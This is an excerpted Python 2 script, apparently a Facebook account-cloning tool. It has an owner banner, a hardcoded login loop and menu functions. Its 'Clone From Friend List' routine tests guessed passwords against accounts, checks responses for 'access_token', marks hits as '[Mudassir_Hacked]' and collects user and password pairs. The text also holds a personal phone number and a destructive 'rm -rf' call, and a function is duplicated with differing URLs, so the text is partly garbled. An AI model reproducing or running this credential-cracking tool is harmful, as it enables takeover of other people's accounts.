#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Mudassir Nadeem Rajput
...
print  """
\033[1;95m❖⚏⚏⚏L💙U⚏⚏⚏❖❖⚏⚏⚏L💙U⚏⚏⚏❖
\033[1;95m[Owner    Mudassir Ahmed]
\033[1;95m[whatsap   03439635677        ]
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Mudassir_Nadeem
	    time.sleep(2)
            loop = 'false'
        else:
...
def pilih():
	...
	if unikers =="":
		...
		os.system('xdg-open https://gitub.com/Mudassirnadeem1214')
	        menu()		
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
...
def pilih():
	...
	if unikers =="":
		...
		os.system('xdg-open https://github.com/Mudassirnadeem5214')
                menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
...
def super():
	...
	os.system('clear')
	print logo
	print "\033[1;97m[1]\x1b[1;96mClone From Friend List{Mudassir}"
	...
	def main(arg):
		...
		try:													
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;91m+\x1b[1;92m[Mudassir_Hacked]'											
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[1;93m+\x1b[1;96m[Mudassir_CP]'
